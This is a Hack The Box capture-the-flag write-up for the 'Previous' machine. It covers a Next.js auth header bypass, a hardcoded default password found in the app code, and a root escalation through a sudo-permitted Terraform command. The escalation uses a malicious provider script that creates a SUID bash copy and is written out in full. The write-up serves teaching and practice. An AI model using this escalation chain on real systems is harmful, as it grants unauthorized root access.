# CTF – Previous (Writeup)

## Context

In this Hack The Box challenge, the target machine is reachable through the domain `previous.htb`.  
The web app is built on **Next.js** and handles authentication with `next-auth`.

The goal is to get initial access to the app, then escalate privileges up to **root** on the machine.

---

## Initial recon – Next.js application

Hitting the website, I notice the app always returns **HTTP 307** redirects to the following endpoint:

    /api/auth/signin?callbackUrl=...

This behavior is typical of a **Next.js** app using `next-auth`.

After some research, I find a known vulnerability that lets you **bypass some protections** by manipulating specific headers:

- `X-Forwarded-For`
- `X-Forwarded-Host`
- `X-Forwarded-Proto`

This vulnerability is publicly documented (CVE-2025-29927).

---

## Bypassing access to internal routes

By tweaking the HTTP headers on the requests, I reach internal routes that are normally protected, notably:

    /api/auth
    /api/auth/providers
    /api/auth/session

That lets me explore the backend authentication logic.

---

## Finding an application account

Auditing the code and the auth-related endpoints, I find a **Credentials** provider defined in `lib/auth.ts`.

A critical condition shows up in the code:

    if (
      credentials?.username === "jeremy" &&
      credentials.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
    )

This logic reveals:
- an application account named **jeremy**
- a **default cleartext password** if the `ADMIN_SECRET` environment variable isn't set

---

## Initial access – Authenticating as jeremy

I test these credentials through the login form:

- User: jeremy  
- Password: MyNameIsJeremyAndILovePancakes  

The login succeeds.  
I now have valid credentials to access the system.

---

## SSH access

I try an SSH connection with these credentials:

    ssh jeremy@<IP>

The connection succeeds and I get a shell as user **jeremy**.

---

## Local enumeration

Once connected, I start with standard local enumeration.

I check the sudo privileges:

    sudo -l

Result:

    (root) /usr/bin/terraform -chdir=/opt/examples apply

The `jeremy` user is allowed to run **Terraform as root**, but only with this exact command.

---

## Looking at Terraform – Provider Override

Terraform can load **local providers** through a user config file `~/.terraformrc`.

This feature can be abused to force Terraform to load a **malicious provider** controlled by the user.

---

## Creating a malicious Terraform provider

I create a fake Terraform provider in my user directory:

    mkdir -p ~/.terraform.d/plugins

Then I create the malicious binary:

    cat > ~/.terraform.d/plugins/terraform-provider-examples_v99.0.0 <<'EOF'
    #!/bin/sh
    cp /bin/bash /tmp/bashroot
    chmod u+s /tmp/bashroot
    exit 1
    EOF

    chmod +x ~/.terraform.d/plugins/terraform-provider-examples_v99.0.0

---

## Configuring the provider override

I configure Terraform to use my local provider through `~/.terraformrc`:

    cat > ~/.terraformrc <<'EOF'
    provider_installation {
      dev_overrides {
        "previous.htb/terraform/examples" = "/home/jeremy/.terraform.d/plugins"
      }
      direct {}
    }
    EOF

---

## Running Terraform as root

I run **exactly** the command allowed by sudo, forcing Terraform to use my config:

    sudo TF_CLI_CONFIG_FILE=/home/jeremy/.terraformrc \
    /usr/bin/terraform -chdir=/opt/examples apply

Terraform fails during the provider handshake, but the malicious binary runs **with root privileges**.

Result:
- `/tmp/bashroot` is created
- a bash binary with the **SUID root** bit

---

## Final escalation

I run the SUID binary:

    /tmp/bashroot -p
    id

I get a **root** shell on the machine.

---

## Attack-chain summary

- Identified a vulnerable Next.js application
- Bypassed protections through HTTP headers (CVE-2025-29927)
- Reached internal authentication endpoints
- Found an application account with a default password
- SSH access as jeremy
- Found a sudo right on Terraform
- Abused a Terraform provider override
- Arbitrary code execution as root
- Got a root shell

---

## Conclusion

This challenge shows:
- the risk of misconfigured web frameworks
- how dangerous default secrets are in production
- the critical impact of infrastructure tools run with sudo
- the dangers of unrestricted extension mechanisms (Terraform providers)

The exploitation combines:
- application attack
- code analysis
- Linux post-exploitation
- advanced privilege escalation through a DevOps tool

---

## Skills demonstrated

- Next.js application analysis
- Logic vulnerability exploitation
- HTTP header manipulation
- Authentication code audit
- SSH access and local enumeration
- sudo rights analysis
- Terraform exploitation
- Linux privilege escalation up to root
